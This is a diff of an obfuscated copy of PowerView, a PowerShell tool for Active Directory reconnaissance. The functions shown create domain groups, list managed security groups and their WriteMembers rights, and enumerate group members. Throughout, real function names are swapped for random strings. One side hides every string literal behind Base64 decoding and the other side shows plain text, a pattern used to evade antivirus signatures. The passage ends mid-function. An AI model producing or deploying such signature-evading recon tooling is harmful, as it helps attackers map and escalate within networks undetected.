@@ -6217,9 +6221,9 @@ function vehehs {
     $ContextArguments = @{
         'Identity' = $SamAccountName
     }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-    $Context = vfqaum @ContextArguments
+    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
+    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
+    $Context = aozfoj @ContextArguments
 
     if ($Context) {
         $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($Context.Context)
@@ -6227,37 +6231,37 @@ function vehehs {
         
         $Group.SamAccountName = $Context.Identity
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZQ==")))]) {
+        if ($PSBoundParameters['Name']) {
             $Group.Name = $Name
         }
         else {
             $Group.Name = $Context.Identity
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlzcGxheU5hbWU=")))]) {
+        if ($PSBoundParameters['DisplayName']) {
             $Group.DisplayName = $DisplayName
         }
         else {
             $Group.DisplayName = $Context.Identity
         }
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVzY3JpcHRpb24=")))]) {
+        if ($PSBoundParameters['Description']) {
             $Group.Description = $Description
         }
 
-        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1Eb21haW5Hcm91cF0gQXR0ZW1wdGluZyB0byBjcmVhdGUgZ3JvdXAgJyRTYW1BY2NvdW50TmFtZQ==")))
+        Write-Verbose "[New-DomainGroup] Attempting to create group '$SamAccountName'"
         try {
             $Null = $Group.Save()
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1Eb21haW5Hcm91cF0gR3JvdXAgJyRTYW1BY2NvdW50TmFtZScgc3VjY2Vzc2Z1bGx5IGNyZWF0ZWQ=")))
+            Write-Verbose "[New-DomainGroup] Group '$SamAccountName' successfully created"
             $Group
         }
         catch {
-            Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1Eb21haW5Hcm91cF0gRXJyb3IgY3JlYXRpbmcgZ3JvdXAgJyRTYW1BY2NvdW50TmFtZScgOiB7MH0="))) -f $_)
+            Write-Warning ("[New-DomainGroup] Error creating group '$SamAccountName' : {0}" -f $_)
         }
     }
 }
 
 
-function kpilkd {
+function srhfut {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -6282,7 +6286,7 @@ function kpilkd {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -6302,22 +6306,22 @@ function kpilkd {
 
     BEGIN {
         $SearcherArguments = @{
-            'LDAPFilter' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYobWFuYWdlZEJ5PSopKGdyb3VwVHlwZToxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0yMTQ3NDgzNjQ4KSk=")))
-            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZE5hbWUsbWFuYWdlZEJ5LHNhbWFjY291bnR0eXBlLHNhbWFjY291bnRuYW1l")))
+            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
+            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
     }
 
     PROCESS {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
-            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain
+        if ($PSBoundParameters['Domain']) {
+            $SearcherArguments['Domain'] = $Domain
             $TargetDomain = $Domain
         }
         else {
@@ -6325,39 +6329,39 @@ function kpilkd {
         }
 
         
-        pvupkd @SearcherArguments | ForEach-Object {
-            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWUsbmFtZSxzYW1hY2NvdW50dHlwZSxzYW1hY2NvdW50bmFtZSxvYmplY3RzaWQ=")))
-            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $_.managedBy
-            $Null = $SearcherArguments.Remove(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg=="))))
+        xcrlsg @SearcherArguments | ForEach-Object {
+            $SearcherArguments['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
+            $SearcherArguments['Identity'] = $_.managedBy
+            $Null = $SearcherArguments.Remove('LDAPFilter')
 
             
             
-            $GroupManager = kzvwpf @SearcherArguments
+            $GroupManager = guawbd @SearcherArguments
             
             $ManagedGroup = New-Object PSObject
-            $ManagedGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $_.samaccountname
-            $ManagedGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBEaXN0aW5ndWlzaGVkTmFtZQ=="))) $_.distinguishedname
-            $ManagedGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWFuYWdlck5hbWU="))) $GroupManager.samaccountname
-            $ManagedGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWFuYWdlckRpc3Rpbmd1aXNoZWROYW1l"))) $GroupManager.distinguishedName
+            $ManagedGroup | Add-Member Noteproperty 'GroupName' $_.samaccountname
+            $ManagedGroup | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
+            $ManagedGroup | Add-Member Noteproperty 'ManagerName' $GroupManager.samaccountname
+            $ManagedGroup | Add-Member Noteproperty 'ManagerDistinguishedName' $GroupManager.distinguishedName
 
             
             if ($GroupManager.samaccounttype -eq 0x10000000) {
-                $ManagedGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWFuYWdlclR5cGU="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXA=")))
+                $ManagedGroup | Add-Member Noteproperty 'ManagerType' 'Group'
             }
             elseif ($GroupManager.samaccounttype -eq 0x30000000) {
-                $ManagedGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWFuYWdlclR5cGU="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcg==")))
+                $ManagedGroup | Add-Member Noteproperty 'ManagerType' 'User'
             }
 
             $ACLArguments = @{
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk="))) = $_.distinguishedname
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmlnaHRzRmlsdGVy"))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVNZW1iZXJz")))
+                'Identity' = $_.distinguishedname
+                'RightsFilter' = 'WriteMembers'
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+            if ($PSBoundParameters['Server']) { $ACLArguments['Server'] = $Server }
+            if ($PSBoundParameters['SearchScope']) { $ACLArguments['SearchScope'] = $SearchScope }
+            if ($PSBoundParameters['ResultPageSize']) { $ACLArguments['ResultPageSize'] = $ResultPageSize }
+            if ($PSBoundParameters['ServerTimeLimit']) { $ACLArguments['ServerTimeLimit'] = $ServerTimeLimit }
+            if ($PSBoundParameters['Tombstone']) { $ACLArguments['Tombstone'] = $Tombstone }
+            if ($PSBoundParameters['Credential']) { $ACLArguments['Credential'] = $Credential }
 
             
             
@@ -6371,16 +6375,16 @@ function kpilkd {
             
             
 
-            $ManagedGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWFuYWdlckNhbldyaXRl"))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VU5LTk9XTg==")))
+            $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'
 
-            $ManagedGroup.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3Lk1hbmFnZWRTZWN1cml0eUdyb3Vw"))))
+            $ManagedGroup.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
             $ManagedGroup
         }
     }
 }
 
 
-function dfkygh {
+function yimpvw {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -6422,7 +6426,7 @@ function dfkygh {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -6446,113 +6450,113 @@ function dfkygh {
 
     BEGIN {
         $SearcherArguments = @{
-            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bWVtYmVyLHNhbWFjY291bnRuYW1lLGRpc3Rpbmd1aXNoZWRuYW1l")))
+            'Properties' = 'member,samaccountname,distinguishedname'
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
 
         $ADNameArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ADNameArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ADNameArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ADNameArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
+        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
     }
 
     PROCESS {
-        $GroupSearcher = ltdynu @SearcherArguments
+        $GroupSearcher = vydvzz @SearcherArguments
         if ($GroupSearcher) {
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjdXJzZVVzaW5nTWF0Y2hpbmdSdWxl")))]) {
-                $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Identity
-                $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))] = $True
-                $Group = pvupkd @SearcherArguments
+            if ($PSBoundParameters['RecurseUsingMatchingRule']) {
+                $SearcherArguments['Identity'] = $Identity
+                $SearcherArguments['Raw'] = $True
+                $Group = xcrlsg @SearcherArguments
 
                 if (-not $Group) {
-                    Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3Igc2VhcmNoaW5nIGZvciBncm91cCB3aXRoIGlkZW50aXR5OiAkSWRlbnRpdHk=")))
+                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity: $Identity"
                 }
                 else {
-                    $GroupFoundName = $Group.properties.item(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWU="))))[0]
-                    $GroupFoundDN = $Group.properties.item(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWU="))))[0]
+                    $GroupFoundName = $Group.properties.item('samaccountname')[0]
+                    $GroupFoundDN = $Group.properties.item('distinguishedname')[0]
 
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
+                    if ($PSBoundParameters['Domain']) {
                         $GroupFoundDomain = $Domain
                     }
                     else {
                         
                         if ($GroupFoundDN) {
-                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
+                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                         }
                     }
-                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gVXNpbmcgTERBUCBtYXRjaGluZyBydWxlIHRvIHJlY3Vyc2Ugb24gJyRHcm91cEZvdW5kRE4nLCBvbmx5IHVzZXIgYWNjb3VudHMgd2lsbCBiZSByZXR1cm5lZC4=")))
-                    $GroupSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY4KShtZW1iZXJvZjoxLjIuODQwLjExMzU1Ni4xLjQuMTk0MTo9JEdyb3VwRm91bmRETikp")))
-                    $GroupSearcher.PropertiesToLoad.AddRange((([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZE5hbWU=")))))
+                    Write-Verbose "[Get-DomainGroupMember] Using LDAP matching rule to recurse on '$GroupFoundDN', only user accounts will be returned."
+                    $GroupSearcher.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
+                    $GroupSearcher.PropertiesToLoad.AddRange(('distinguishedName'))
                     $Members = $GroupSearcher.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                 }
-                $Null = $SearcherArguments.Remove(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3"))))
+                $Null = $SearcherArguments.Remove('Raw')
             }
             else {
                 $IdentityFilter = ''
                 $Filter = ''
                 $Identity | Where-Object {$_} | ForEach-Object {
-                    $IdentityInstance = $_.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))))
-                    if ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS0=")))) {
-                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdHNpZD0kSWRlbnRpdHlJbnN0YW5jZSk=")))
+                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                    if ($IdentityInstance -match '^S-1-') {
+                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                     }
-                    elseif ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkNOPQ==")))) {
-                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
-                        if ((-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))])) {
+                    elseif ($IdentityInstance -match '^CN=') {
+                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
+                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                             
                             
-                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
-                            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXh0cmFjdGVkIGRvbWFpbiAnJElkZW50aXR5RG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZQ==")))
-                            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityDomain
-                            $GroupSearcher = ltdynu @SearcherArguments
+                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                            $SearcherArguments['Domain'] = $IdentityDomain
+                            $GroupSearcher = vydvzz @SearcherArguments
                             if (-not $GroupSearcher) {
-                                Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gVW5hYmxlIHRvIHJldHJpZXZlIGRvbWFpbiBzZWFyY2hlciBmb3IgJyRJZGVudGl0eURvbWFpbg==")))
+                                Write-Warning "[Get-DomainGroupMember] Unable to retrieve domain searcher for '$IdentityDomain'"
                             }
                         }
                     }
-                    elseif ($IdentityInstance -imatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlswLTlBLUZdezh9LShbMC05QS1GXXs0fS0pezN9WzAtOUEtRl17MTJ9JA==")))) {
-                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))) + $_.ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WDI=")))) }) -join ''
-                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKQ==")))
+                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
+                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
+                        $IdentityFilter += "(objectguid=$GuidByteString)"
                     }
-                    elseif ($IdentityInstance.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))) {
-                        $ConvertedIdentityInstance = $IdentityInstance.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA==")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ==")))) | vqxllx -OutputType Canonical
+                    elseif ($IdentityInstance.Contains('\')) {
+                        $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | jjxazw -OutputType Canonical
                         if ($ConvertedIdentityInstance) {
-                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw==")))))
-                            $GroupName = $IdentityInstance.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[1]
-                            $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNhbUFjY291bnROYW1lPSRHcm91cE5hbWUp")))
-                            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $GroupDomain
-                            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXh0cmFjdGVkIGRvbWFpbiAnJEdyb3VwRG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZQ==")))
-                            $GroupSearcher = ltdynu @SearcherArguments
+                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
+                            $GroupName = $IdentityInstance.Split('\')[1]
+                            $IdentityFilter += "(samAccountName=$GroupName)"
+                            $SearcherArguments['Domain'] = $GroupDomain
